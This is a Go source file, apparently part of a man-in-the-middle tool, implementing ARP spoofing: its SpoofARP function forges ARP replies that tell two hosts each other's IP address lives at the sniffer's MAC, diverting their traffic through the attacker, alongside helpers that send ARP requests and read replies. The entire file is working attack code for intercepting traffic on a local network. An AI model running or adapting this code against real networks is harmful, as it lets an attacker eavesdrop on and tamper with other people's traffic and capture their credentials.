package arp

import (
	"bytes"
	"fmt"
	"net"

	"github.com/e0d1n/mitm/utils"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type ARPSpoffing struct {
	Node1   Node
	Node2   Node
	Sniffer Node
}

type Node struct {
	Ip []byte
	Hw []byte
}

func IndexNode(array []Node, Ip []byte) int {
	for i, v := range array {
		if bytes.Equal(Ip, v.Ip) {
			return i
		}
	}
	return -1
}

func IndexByte(array [][]byte, Ip []byte) int {
	for i, v := range array {
		if bytes.Equal(Ip, v) {
			return i
		}
	}
	return -1
}

func SpoofARP(handle *pcap.Handle, table *ARPSpoffing) {
	var (
		buffer1 gopacket.SerializeBuffer
		buffer2 gopacket.SerializeBuffer
		options gopacket.SerializeOptions
	)
	// Node1 -> Sniffer
	ethernetLayer1 := &layers.Ethernet{
		// The Node1 will send a frame to Node2
		SrcMAC:       table.Sniffer.Hw,
		DstMAC:       table.Node2.Hw,
		EthernetType: layers.EthernetTypeARP,
	}

	// Node2 -> Sniffer
	ethernetLayer2 := &layers.Ethernet{
		// The Node2 will send a frame to Node1
		SrcMAC:       table.Sniffer.Hw,
		DstMAC:       table.Node1.Hw,
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer1 := &layers.ARP{
		AddrType:        0x1,
		Protocol:        layers.EthernetTypeIPv4,
		HwAddressSize:   0x6,
		ProtAddressSize: 0x4,
		// Request 1, Reply 2
		Operation: 0x2,
		// The Node2(source) will tell to Node2(destination), that
		// hist mac is at SnifferHw
		SourceHwAddress:   table.Sniffer.Hw,
		SourceProtAddress: table.Node1.Ip,
		// NOTE: Maybe use broadcast
		DstHwAddress:   table.Node2.Hw,
		DstProtAddress: table.Node2.Ip,
	}

	arpLayer2 := &layers.ARP{
		AddrType:        0x1,
		Protocol:        layers.EthernetTypeIPv4,
		HwAddressSize:   0x6,
		ProtAddressSize: 0x4,
		// Request 1, Reply 2
		Operation: 0x2,
		// The Node1(source) will tell to Node2(destination), that
		// hist mac is at SnifferHw
		SourceHwAddress:   table.Sniffer.Hw,
		SourceProtAddress: table.Node2.Ip,
		// NOTE: Maybe use broadcast
		DstHwAddress:   table.Node1.Hw,
		DstProtAddress: table.Node1.Ip,
	}

	// Create the packet with the layers for Node1
	buffer1 = gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer1, options,
		ethernetLayer1,
		arpLayer1,
	)

	// Create the packet with the layers for Node2
	buffer2 = gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer2, options,
		ethernetLayer2,
		arpLayer2,
	)

	outgoingPacket1 := buffer1.Bytes()
	outgoingPacket2 := buffer2.Bytes()

	// Send the packets
	err1 := handle.WritePacketData(outgoingPacket1)
	err2 := handle.WritePacketData(outgoingPacket2)
	if err1 != nil {
		//TODO: Log
		fmt.Println(err1)
	}

	if err2 != nil {
		//TODO: Log
		fmt.Println(err2)
	}
}

// RequestARP writes an ARP request to the pcap handle.
func RequestARP(handle *pcap.Handle, ifacename string, ip <-chan []byte, stop chan bool) {
	snifferip, snifferhw := utils.GetIPv4Hw(ifacename)
	for {
		var request []byte
		select {
		case <-stop:
			return
		case request = <-ip:
			eth := layers.Ethernet{
				SrcMAC:       snifferhw,
				DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
				EthernetType: layers.EthernetTypeARP,
			}
			arp := layers.ARP{
				AddrType:          layers.LinkTypeEthernet,
				Protocol:          layers.EthernetTypeIPv4,
				HwAddressSize:     6,
				ProtAddressSize:   4,
				Operation:         layers.ARPRequest,
				SourceHwAddress:   []byte(snifferhw),
				SourceProtAddress: []byte(snifferip),
				DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
			}
			// Set up buffer and options for serialization.
			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}
			// Send one packet for every address.
			arp.DstProtAddress = request
			gopacket.SerializeLayers(buf, opts, &eth, &arp)
			handle.WritePacketData(buf.Bytes())
			fmt.Println("Requested")
		}
	}

}

type ARPResponse struct {
	IP []byte
	HW []byte
}

func ReadARP(handle *pcap.Handle, ifacename string, response chan<- ARPResponse, stop chan bool) {

	_, snifferhw := utils.GetIPv4Hw(ifacename)

	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()
	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			arpl := arpLayer.(*layers.ARP)
			if arpl.Operation == layers.ARPReply && bytes.Equal(snifferhw, arpl.DstHwAddress) {
				// This is a packet I sent.
				response <- ARPResponse{net.IP(arpl.SourceProtAddress), arpl.SourceHwAddress}
			}
		}

	}
}

func GetMAC(handle *pcap.Handle, ip string) []byte {
	return []byte{}
}
